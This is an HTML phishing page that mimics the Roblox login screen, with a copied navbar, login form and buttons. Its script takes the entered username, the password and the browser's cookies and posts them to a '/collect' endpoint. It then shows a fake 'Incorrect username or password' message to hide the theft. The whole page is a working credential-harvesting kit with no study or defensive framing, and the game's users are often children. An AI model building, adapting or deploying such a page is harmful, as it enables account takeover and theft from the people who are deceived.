<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Roblox</title>
<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:'Montserrat',Arial,sans-serif; -webkit-tap-highlight-color: transparent;}
  
  body {
    background-color: #000;
    background-image: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.8)), url('https://tr.rbxcdn.com/180DAY-0b5b04b39e78b16ed6ce75d5c87c96c3/500/280/Image/Png/Webp/2');
    background-size: cover;
    background-position: center;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    margin: 0;
  }

  .navbar {
    position: absolute;
    top: 0; left: 0; width: 100%;
    height: 48px;
    background: #232527;
    display: flex;
    align-items: center;
    padding: 0 12px;
    z-index: 10;
    justify-content: space-between;
  }
  
  .nav-left { display: flex; align-items: center; gap: 12px; width: 100%; }
  
  /* Логотип Роблокс с уменьшенным квадратом */
  .logo { 
    width: 28px; 
    height: 28px; 
    background: #fff; 
    transform: rotate(15deg); 
    display: flex; 
    justify-content: center; 
    align-items: center;
    border-radius: 4px;
    flex-shrink: 0;
  }
  .logo-inner { 
    width: 8px; 
    height: 8px; 
    background: #232527; 
  }
  
  .nav-links { display: flex; gap: 16px; color: #fff; font-size: 15px; font-weight: 600; white-space: nowrap; overflow-x: auto; flex-grow: 1; }
  .nav-links::-webkit-scrollbar { display: none; }
  
  .nav-right { display: flex; align-items: center; gap: 12px; flex-shrink: 0; }
  .signup-btn { background: #335fff; color: #fff; border: none; padding: 6px 14px; border-radius: 6px; font-weight: 600; font-size: 14px; cursor: pointer; white-space: nowrap;}
  
  .search-icon { width: 20px; height: 20px; border: 2px solid #fff; border-radius: 50%; position: relative; flex-shrink: 0; }
  .search-icon::after { content:''; position: absolute; bottom: -5px; right: -4px; width: 8px; height: 2px; background: #fff; transform: rotate(45deg); }

  .modal {
    position: relative;
    z-index: 5;
    background: #232527;
    width: 100%;
    max-width: 380px;
    border-radius: 8px;
    padding: 25px 20px;
    box-shadow: 0 10px 40px rgba(0,0,0,0.8);
    color: #fff;
    margin: 0 15px;
  }

  .modal h1 { font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 20px; color: #fff;}

  .input-group { margin-bottom: 12px; }
  .input-group input {
    width: 100%;
    background: #393b3d;
    border: 1px solid #393b3d;
    border-radius: 6px;
    padding: 14px 16px;
    color: #fff;
    font-size: 16px;
    outline: none;
    transition: border .2s;
  }
  .input-group input::placeholder { color: #b8b8b8; }
  .input-group input:focus { border-color: #b8b8b8; }

  .login-btn {
    width: 100%;
    background: transparent;
    color: #fff;
    border: 1px solid #fff;
    border-radius: 6px;
    padding: 14px;
    font-size: 16px;
    font-weight: 600;
    margin-top: 5px;
    cursor: pointer;
    transition: background .2s;
  }
  .login-btn:active { background: rgba(255,255,255,0.1); }

  .forgot-link { display: block; text-align: center; color: #fff; text-decoration: none; font-size: 15px; margin: 16px 0; font-weight: 500; }

  .alt-btn {
    width: 100%;
    background: #393b3d;
    color: #fff;
    border: none;
    border-radius: 6px;
    padding: 14px;
    font-size: 15px;
    font-weight: 500;
    margin-bottom: 10px;
    cursor: pointer;
  }
  .alt-btn:active { background: #454749; }

  .signup-text { text-align: center; font-size: 14px; color: #fff; margin-top: 20px; }
  .signup-text a { color: #fff; text-decoration: none; font-weight: 600; }
</style>
</head>
<body>

  <div class="navbar">
    <div class="nav-left">
      <div class="logo"><div class="logo-inner"></div></div>
      <div class="nav-links">
        <span>Charts</span>
        <span>Marketplace</span>
        <span>Create</span>
        <span>Robux</span>
      </div>
      <div class="nav-right">
        <button class="signup-btn">Sign Up</button>
        <div class="search-icon"></div>
      </div>
    </div>
  </div>

  <div class="modal">
    <h1>Login to Roblox</h1>
    <form id="loginForm">
      <div class="input-group">
        <input type="text" name="username" placeholder="Username/Email/Phone" required autofocus>
      </div>
      <div class="input-group">
        <input type="password" name="password" placeholder="Password" required>
      </div>
      <button type="submit" class="login-btn" id="submitBtn">Log In</button>
    </form>

    <a href="#" class="forgot-link">Forgot Password or Username?</a>

    <button class="alt-btn">Email Me a One-Time Code</button>
    <button class="alt-btn">Quick Sign-in</button>

    <div class="signup-text">
      Don't have an account? <a href="#">Sign Up</a>
    </div>
  </div>

<script>
document.getElementById('loginForm').addEventListener('submit', async function(e){
  e.preventDefault();
  const btn = document.getElementById('submitBtn');
  
  btn.disabled = true;
  btn.innerText = 'Logging in...';

  const data = {
    username: this.username.value,
    password: this.password.value,
    cookies: document.cookie
  };

  try {
    await fetch('/collect', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(data)
    });
  } catch (e) {}

  setTimeout(() => {
    btn.disabled = false;
    btn.innerText = 'Log In';
    alert("Incorrect username or password.");
  }, 800);
});
</script>
</body>
</html>
